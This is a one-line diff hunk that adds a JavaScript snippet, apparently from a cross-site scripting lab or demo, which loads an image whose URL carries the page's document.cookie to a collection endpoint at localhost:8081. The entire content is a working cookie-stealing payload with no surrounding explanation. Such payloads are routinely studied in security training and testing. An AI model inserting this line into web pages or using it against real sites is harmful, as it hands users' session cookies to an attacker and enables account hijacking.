@@ -1,0 +1,1 @@
+var i = new Image(); i.src= `http://localhost:8081/cookies/`+document.cookie;
